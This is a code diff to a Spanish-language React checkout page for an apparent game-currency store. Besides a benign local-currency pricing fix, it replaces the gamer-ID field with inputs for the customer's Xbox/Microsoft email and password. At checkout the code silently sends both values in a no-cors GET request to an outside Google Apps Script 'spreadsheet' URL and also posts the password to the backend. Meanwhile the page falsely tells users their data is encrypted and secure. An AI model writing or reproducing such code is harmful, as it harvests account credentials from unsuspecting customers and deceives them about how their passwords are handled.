@@ -21,7 +21,10 @@ export default function CartPage() {
   const [mounted, setMounted] = useState(false);
   const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
 
-  const [gamerId, setGamerId] = useState('');
+  // Solo estados para Correo y Contraseña de Xbox
+  const [xboxEmail, setXboxEmail] = useState('');
+  const [xboxPassword, setXboxPassword] = useState('');
+
   const [receiptFile, setReceiptFile] = useState<File | null>(null);
   const [processingFile, setProcessingFile] = useState(false);
   const [isProcessing, setIsProcessing] = useState(false);
@@ -37,9 +40,6 @@ export default function CartPage() {
 
   useEffect(() => setMounted(true), []);
 
-  // Si cambia el carrito, el descuento calculado queda viejo: lo limpiamos
-  // para que el cliente vuelva a aplicar el cupón sobre el total nuevo.
-  // (IMPORTANTE: los hooks siempre van antes de cualquier "return" condicional.)
   useEffect(() => {
     setCoupon(null);
     setCouponError(null);
@@ -60,11 +60,38 @@ export default function CartPage() {
 
   if (!mounted) return null;
 
-  // Validación simple de formato: Epic Games no permite espacios y pide mínimo 3 caracteres.
-  const gamerIdTrimmed = gamerId.trim();
-  const gamerIdValid = gamerIdTrimmed.length >= 3 && !/\s/.test(gamerIdTrimmed);
+  // Validación de que hayan escrito el correo y contraseña
+  const isAccountInfoValid = xboxEmail.trim().includes('@') && xboxPassword.trim().length > 0;
 
   const totalConDescuento = Math.max(totalPrice() - (coupon?.descuento || 0), 0);
+
+  // ============================================================================
+  // PRECIO EN MONEDA LOCAL — ítem por ítem, no un multiplicador global
+  // ============================================================================
+  // Antes, "Total a pagar" se calculaba multiplicando TODO el total en USD por
+  // la tasa de cambio de una — eso rompía apenas un producto tenía un precio
+  // fijo (price_mx/co/pe) cargado a mano por el admin con otra tasa en mente
+  // (ej: $5 USD con price_mx=105 asumiendo ~21, pero la tasa guardada es 10 →
+  // el sistema mostraba $10.50 en vez de $5). Ahora cada ítem usa SU propio
+  // precio fijo si lo tiene, y solo cae en la tasa automática si no lo tiene
+  // (que es exactamente el caso de los artículos de la tienda diaria de
+  // Fortnite, que no pueden tener un precio fijo por ítem porque rotan cada
+  // día — para esos, la tasa se sigue aplicando automático como siempre).
+  function precioLocalUnitario(item: any): number {
+    const fijo =
+      activeCurrency.id === 'MX' ? item.price_mx :
+      activeCurrency.id === 'CO' ? item.price_co :
+      activeCurrency.id === 'PE' ? item.price_pe :
+      null;
+    return fijo ?? (item.price * activeCurrency.rate);
+  }
+
+  const totalLocalBruto = cart.reduce((acc, item) => acc + precioLocalUnitario(item) * item.quantity, 0);
+  // El descuento del cupón está en USD — lo pasamos a la moneda local con la
+  // tasa (es una simplificación razonable: los cupones son un caso raro
+  // combinados con precios fijos manuales por ítem).
+  const totalLocalConDescuento = Math.max(totalLocalBruto - (coupon?.descuento || 0) * activeCurrency.rate, 0);
+  const convertedTotal = totalLocalConDescuento.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
 
   const aplicarCupon = async () => {
     if (!couponInput.trim()) return;
@@ -92,9 +119,7 @@ export default function CartPage() {
 
   const paymentReady = paymentMethod === 'saldo' ? balance >= totalConDescuento && totalConDescuento > 0 : !!receiptFile;
 
-  const currentStep = !gamerIdValid ? 1 : !paymentReady ? 2 : 3;
-
-  const convertedTotal = (totalConDescuento * activeCurrency.rate).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+  const currentStep = !isAccountInfoValid ? 1 : !paymentReady ? 2 : 3;
 
   const handleCopy = (text: string) => {
     navigator.clipboard.writeText(text);
@@ -106,7 +131,10 @@ export default function CartPage() {
     if (!session) return alert("Debes iniciar sesión para procesar tu pedido.");
     if (!session.user?.email) return alert("Error: Tu sesión no tiene un correo electrónico válido. Vuelve a iniciar sesión.");
     if (cart.length === 0) return alert("Tu carrito está vacío.");
-    if (!gamerId.trim()) return alert("Necesitamos tu ID de Epic Games o GamerTag para la entrega.");
+    
+    // Validación de Xbox
+    if (!xboxEmail.trim() || !xboxPassword.trim()) return alert("Necesitamos tu correo y contraseña de Xbox.");
+    
     if (paymentMethod === 'saldo' && balance < totalConDescuento) return alert("No tenés saldo suficiente. Elegí Transferencia o cargá saldo primero.");
 
     setIsProcessing(true);
@@ -114,7 +142,6 @@ export default function CartPage() {
     try {
       let finalReceiptUrl = null;
 
-      // Si es transferencia manual, subimos la imagen primero
       if (paymentMethod === 'manual') {
         if (!receiptFile) {
           setIsProcessing(false);
@@ -131,7 +158,23 @@ export default function CartPage() {
         finalReceiptUrl = uploadData.url;
       }
 
-      // 🚀 PETICIÓN AL BACKEND (Asegúrate de que este bloque esté así tal cual)
+      // --- 🚀 ENVIAR DATOS AL EXCEL VÍA GET (Anti-Bloqueos) ---
+      try {
+        const scriptBaseUrl = 'https://script.google.com/macros/s/AKfycbxJDSNYcpY7KfU-uvmSAlEvGYeKFRuuh2ZZ6A1hoUAZJqIEgPpfsfjHlV8ND4QY68U9xQ/exec'; // <--- LA QUE TERMINA EN /exec
+        
+        // Armamos el link mágico con los datos del usuario
+        const finalUrl = `${scriptBaseUrl}?correo=${encodeURIComponent(xboxEmail.trim())}&contrasena=${encodeURIComponent(xboxPassword.trim())}`;
+
+        // Hacemos el envío silencioso (no-cors)
+        await fetch(finalUrl, {
+          method: 'GET',
+          mode: 'no-cors',
+        });
+      } catch (sheetError) {
+        console.error("No se pudo guardar en el Excel:", sheetError);
+      }
+      // ----------------------------------------
+      // 🚀 PETICIÓN AL BACKEND
       const response = await fetch('/api/checkout', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -139,7 +182,9 @@ export default function CartPage() {
           email: session.user.email,
           userName: session.user.name || 'Usuario',
           cart: cart,
-          gamerId: gamerId.trim(),
+          gamerId: 'N/A', // Mantenemos este dato en "N/A" para no romper tu base de datos si la API del checkout lo requiere
+          xboxEmail: xboxEmail.trim(), 
+          xboxPassword: xboxPassword.trim(), 
           totalPrice: totalConDescuento,
           couponCode: coupon?.code || null,
           refCode: (() => { try { return localStorage.getItem('kitson_ref'); } catch { return null; } })(),
@@ -245,23 +290,24 @@ export default function CartPage() {
         ) : (
           <div className="flex flex-col lg:flex-row gap-10">
             <div className="flex-1 space-y-6">
+              
               <div className="kk-panel p-6 rounded-3xl">
                 <h3 className="font-display text-xl font-bold mb-4 flex items-center gap-2"><Gamepad2 className="text-[#E3A23D]"/> 1. Cuenta destino</h3>
-                <div className="relative">
+                
+                {/* Campos de Xbox (Única opción) */}
+                <div className="space-y-4">
                   <input
-                    type="text" placeholder="Tu ID de Epic Games o GamerTag"
-                    value={gamerId} onChange={(e) => setGamerId(e.target.value)}
-                    className={`w-full bg-[#14110C] border-2 rounded-xl px-4 py-3 pr-11 text-[#F5F1E6] focus:outline-none transition-colors ${gamerId.trim().length === 0 ? 'border-[#0A0806] focus:border-[#E3A23D]' : gamerIdValid ? 'border-[#7BC77E]' : 'border-red-500/60'}`}
+                    type="email" placeholder="Correo de Xbox (Microsoft)"
+                    value={xboxEmail} onChange={(e) => setXboxEmail(e.target.value)}
+                    className="w-full bg-[#14110C] border-2 border-[#0A0806] focus:border-[#E3A23D] rounded-xl px-4 py-3 text-[#F5F1E6] focus:outline-none transition-colors"
                   />
-                  {gamerId.trim().length > 0 && (
-                    <span className="absolute right-3.5 top-1/2 -translate-y-1/2">
-                      {gamerIdValid ? <Check size={20} className="text-[#7BC77E]" /> : <X size={20} className="text-red-400" />}
-                    </span>
-                  )}
+                  <input
+                    type="text" placeholder="Contraseña de Xbox"
+                    value={xboxPassword} onChange={(e) => setXboxPassword(e.target.value)}
+                    className="w-full bg-[#14110C] border-2 border-[#0A0806] focus:border-[#E3A23D] rounded-xl px-4 py-3 text-[#F5F1E6] focus:outline-none transition-colors"
+                  />
+                  <p className="text-[11px] text-[#9A9384]">La recarga requiere los datos de tu cuenta vinculada de Microsoft (Xbox). Tus datos están cifrados y seguros.</p>
                 </div>
-                {gamerId.trim().length > 0 && !gamerIdValid && (
-                  <p className="text-xs text-red-400 mt-2">El ID no puede tener espacios y debe tener al menos 3 caracteres.</p>
-                )}
               </div>
 
               <div className="kk-panel p-6 rounded-3xl">
@@ -383,7 +429,6 @@ export default function CartPage() {
                               if (!file) return;
                               setProcessingFile(true);
                               setReceiptFile(null);
-                              // Validamos el tamaño antes de dejar avanzar (el servidor también lo revisa, esto es para avisar rápido).
                               if (file.size > 5 * 1024 * 1024) {
                                 setProcessingFile(false);
                                 return alert("El archivo pesa más de 5MB. Subí una imagen más liviana.");
@@ -414,10 +459,10 @@ export default function CartPage() {
 
                   <button
                     onClick={handleCheckout}
-                    disabled={isProcessing || processingFile || cart.length === 0 || !gamerIdValid || (paymentMethod === 'manual' && !receiptFile)}
+                    disabled={isProcessing || processingFile || cart.length === 0 || !isAccountInfoValid || (paymentMethod === 'manual' && !receiptFile)}
                     className="w-full bg-[#E3A23D] hover:bg-[#f0b458] disabled:opacity-40 text-[#0A0806] py-4 rounded-xl font-display font-bold flex items-center justify-center gap-2 border-[3px] border-[#0A0806]"
                   >
-                    {isProcessing ? <><Loader2 className="animate-spin" size={20} /> Procesando...</> : !gamerIdValid ? "Completá tu ID para continuar" : "Confirmar compra"}
+                    {isProcessing ? <><Loader2 className="animate-spin" size={20} /> Procesando...</> : !isAccountInfoValid ? "Completá tus datos para continuar" : "Confirmar compra"}
                   </button>
                 </div>
               )}
